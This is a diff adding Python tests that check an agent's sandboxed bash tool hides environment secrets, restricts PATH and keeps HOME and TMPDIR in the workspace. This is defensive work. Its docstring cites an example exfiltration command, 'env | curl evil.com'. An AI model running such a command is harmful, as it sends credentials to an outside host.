@@ -167,6 +167,68 @@ class TestExecuteTool:
         assert "unknown" in result
 
 
+class TestBashEnvHardening:
+    """Verify run_bash subprocesses do not inherit secrets / dev env.
+
+    A misbehaving skill could `env | curl evil.com` — these tests pin the
+    contract that the parent's secrets are not visible inside the sandboxed
+    shell. Skips on platforms without /usr/bin/env (Windows CI, etc.).
+    """
+
+    def _has_env(self) -> bool:
+        return Path("/usr/bin/env").exists() or Path("/bin/env").exists()
+
+    def test_bash_does_not_inherit_anthropic_key(self, tmp_path: Path, monkeypatch):
+        if not self._has_env():
+            pytest.skip("no /usr/bin/env on this platform")
+        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-SECRET-DO-NOT-LEAK")
+        monkeypatch.setenv("BRAINTRUST_API_KEY", "sk-bt-SECRET-DO-NOT-LEAK")
+        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-SECRET-DO-NOT-LEAK")
+        monkeypatch.setenv("DATABASE_URL", "postgresql://user:pw@host/db")
+        monkeypatch.setenv("GITHUB_TOKEN", "ghp_SECRET")
+        result, err = agent_task._execute_tool(
+            "run_bash", {"command": "env"}, tmp_path, allow_bash=True,
+        )
+        assert err is False, result
+        assert "SECRET-DO-NOT-LEAK" not in result
+        assert "postgresql://" not in result
+        assert "ghp_" not in result
+
+    def test_bash_path_does_not_include_homebrew(self, tmp_path: Path):
+        if not self._has_env():
+            pytest.skip("no /usr/bin/env on this platform")
+        result, err = agent_task._execute_tool(
+            "run_bash", {"command": "echo $PATH"}, tmp_path, allow_bash=True,
+        )
+        assert err is False
+        # Restricted PATH — no /usr/local/bin, no $HOME/.local/bin, no /opt.
+        assert "/usr/local" not in result
+        assert "/opt/" not in result
+        assert ".local/bin" not in result
+        assert result.strip() == "/usr/bin:/bin"
+
+    def test_bash_home_points_inside_workspace(self, tmp_path: Path):
+        if not self._has_env():
+            pytest.skip("no /usr/bin/env on this platform")
+        result, err = agent_task._execute_tool(
+            "run_bash", {"command": "echo $HOME"}, tmp_path, allow_bash=True,
+        )
+        assert err is False
+        # Resolve both sides — macOS may symlink /var → /private/var, etc.
+        # The shell's $HOME echoes whatever string we set; the assertion is
+        # that we set it to the workspace dir, not the developer's actual home.
+        assert str(tmp_path) in result.strip()
+
+    def test_bash_tmpdir_is_inside_workspace(self, tmp_path: Path):
+        if not self._has_env():
+            pytest.skip("no /usr/bin/env on this platform")
+        result, err = agent_task._execute_tool(
+            "run_bash", {"command": "echo $TMPDIR"}, tmp_path, allow_bash=True,
+        )
+        assert err is False
+        assert str(tmp_path) in result.strip()
+
+
 # --- Agent loop tests -----------------------------------------------------
 
 class TestAgentLoop:
